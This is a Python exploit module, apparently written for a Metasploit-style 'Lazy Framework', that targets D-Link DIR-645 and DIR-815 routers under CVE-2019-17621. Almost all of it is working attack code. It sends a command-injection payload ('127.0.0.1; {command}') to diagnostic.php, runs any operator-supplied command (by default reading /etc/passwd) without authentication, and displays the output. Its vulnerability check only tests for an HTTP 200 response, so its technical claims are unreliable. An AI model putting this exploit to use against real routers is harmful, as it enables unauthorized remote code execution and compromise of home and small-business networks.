#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
D-Link DIR-645 & DIR-815 Remote Code Execution
CVE-2019-17621
"""

import requests
import urllib.parse

MODULE_INFO = {
    "name": "D-Link DIR-645/DIR-815 RCE",
    "description": "Unauthenticated Remote Code Execution in D-Link DIR-645 and DIR-815 routers",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "rank": "Excellent",
    "references": [
        "CVE-2019-17621",
        "https://www.exploit-db.com/exploits/47777"
    ],
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {
        "description": "Target router IP address",
        "required": True,
        "default": "192.168.0.1"
    },
    "RPORT": {
        "description": "Target router port",
        "required": False,
        "default": "80"
    },
    "CMD": {
        "description": "Command to execute",
        "required": True,
        "default": "cat /etc/passwd"
    },
    "SSL": {
        "description": "Use SSL",
        "required": False,
        "default": "false"
    },
    "TARGETURI": {
        "description": "Target URI path",
        "required": False,
        "default": "/"
    }
}

class DLinkDirRCE:
    def __init__(self, target, port=80, ssl=False, targeturi="/"):
        self.target = target
        self.port = port
        self.protocol = "https" if ssl else "http"
        self.targeturi = targeturi
        self.base_url = f"{self.protocol}://{target}:{port}{targeturi}"
        
    def check_vulnerable(self):
        """Check if target is vulnerable"""
        try:
            check_url = f"{self.base_url}diagnostic.php"
            response = requests.get(check_url, timeout=10, verify=False)
            return response.status_code == 200
        except:
            return False
    
    def execute_command(self, command):
        """Execute command via diagnostic.php RCE"""
        try:
            # The vulnerability is in diagnostic.php
            payload = {
                "act": "ping",
                "dst": f"127.0.0.1; {command}"
            }
            
            exploit_url = f"{self.base_url}diagnostic.php"
            response = requests.post(exploit_url, data=payload, timeout=10, verify=False)
            
            return response.text
            
        except Exception as e:
            return f"Error: {str(e)}"

def display_exploit_info():
    """Display exploit information"""
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    
    console = Console()
    
    table = Table(show_header=True, header_style="bold red", box=None)
    table.add_column("Module", style="bold yellow")
    table.add_column("Details", style="white")
    
    table.add_row("Name", MODULE_INFO["name"])
    table.add_row("Module", "exploit/linux/router/dlink_dir_rce")
    table.add_row("Disclosure", "2019-10-25")
    table.add_row("Platform", MODULE_INFO["platform"])
    table.add_row("Arch", "mips")
    table.add_row("Rank", MODULE_INFO["rank"])
    
    console.print(Panel(table, title="Exploit Information", border_style="red"))
    
    # Affected devices
    affected_panel = Panel(
        "D-Link DIR-645 (all firmware versions)\n"
        "D-Link DIR-815 (all firmware versions)",
        title="Affected Devices",
        border_style="yellow"
    )
    console.print(affected_panel)

def run(session, options):
    """Main exploit function"""
    from rich.console import Console
    from rich.panel import Panel
    from rich.syntax import Syntax
    from rich.table import Table
    
    console = Console()
    
    # Display exploit info
    display_exploit_info()
    
    # Display options
    current_options = OPTIONS.copy()
    for key in current_options:
        if key in options:
            current_options[key]['value'] = options[key]
    
    table = Table(show_header=True, header_style="bold magenta", box=None)
    table.add_column("Name", style="bold cyan")
    table.add_column("Current Setting", style="green")
    table.add_column("Required", style="yellow")
    table.add_column("Description", style="white")
    
    for name, config in current_options.items():
        current = config.get('value', config.get('default', ''))
        required = "yes" if config.get('required', False) else "no"
        description = config.get('description', '')
        
        table.add_row(name, str(current), required, description)
    
    console.print(Panel(table, title="Module Options (exploit/linux/router/dlink_dir_rce)", border_style="blue"))
    
    # Get options
    rhost = options.get("RHOST", "192.168.0.1")
    rport = options.get("RPORT", "80")
    cmd = options.get("CMD", "cat /etc/passwd")
    ssl = options.get("SSL", "false").lower() == "true"
    targeturi = options.get("TARGETURI", "/")
    
    console.print(f"\n[bold yellow][*][/bold yellow] Target: [cyan]{rhost}:{rport}[/cyan]")
    console.print(f"[bold yellow][*][/bold yellow] Command: [red]{cmd}[/red]")
    
    try:
        # Initialize exploit
        exploit = DLinkDirRCE(rhost, rport, ssl, targeturi)
        
        console.print("\n[bold yellow][*][/bold yellow] Checking if target is vulnerable...")
        if exploit.check_vulnerable():
            console.print("[bold green][+][/bold green] Target appears to be vulnerable!")
            
            console.print("[bold yellow][*][/bold yellow] Executing command via RCE...")
            result = exploit.execute_command(cmd)
            
            if result and "Error" not in result:
                console.print("[bold green][+][/bold green] Command executed successfully!")
                
                # Display result
                syntax = Syntax(result, "text", theme="monokai", line_numbers=True)
                console.print(Panel(syntax, title="Command Output", border_style="green"))
                
            else:
                console.print("[red][-][/red] Command execution failed")
                if result:
                    console.print(f"[red]Error: {result}[/red]")
                    
        else:
            console.print("[red][-][/red] Target does not appear to be vulnerable")
            
    except Exception as e:
        console.print(f"[red][-][/red] Exploit failed: {str(e)}")
